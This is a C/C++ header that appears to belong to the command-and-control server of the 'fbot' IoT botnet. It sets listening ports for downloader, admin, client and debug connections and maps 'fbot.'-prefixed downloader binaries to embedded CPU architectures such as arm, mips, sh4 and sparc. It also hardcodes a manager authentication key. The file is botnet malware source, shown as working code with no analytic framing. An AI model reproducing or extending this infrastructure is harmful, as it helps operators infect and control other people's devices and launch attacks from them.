#pragma once

#include <stdint.h>

#include "def.h"

enum
{
    TRUE = 1,
    FALSE = 0,
    MAX_EVENTS = 1000000,
    //timeout
    TIMEOUT = 180,
    VERIFY_TIMEOUT = 15,
    ADMIN_TIMEOUT = 10,
    //port
    DOWNLOADER_PORT = 1242, //1242
    ADMIN_PORT = 1024,
    CLIENT_PORT = 2231,
    DEBUG_PORT = 5846, // 5843
};

static int downloader_fd = -1;
static int client_fd = -1;
static int admin_fd = -1;
static int debug_fd = -1;
static int efd = -1;

#define DOWNLOADER_PREFIX "fbot."
static std::map<std::string, std::string> downloader_arch =
{
    //downloader //id
    {"arm7",    "01"},
    {"arm4",    "02"},
    {"arm5",    "03"},
    {"arm6",    "04"},
    {"i686",    "05"},
    {"m68k",    "06"},
    {"mips",    "07"},
    {"mipsel",  "08"},
    {"powerpc", "09"},
    {"sh4",     "10"},
    {"sparc",   "11"},
    {"arc",     "12"},
    {"aarch64", "13"},
    {"debug",   "14"}
};

#define MANAGER_AUTH_KEY "poop"

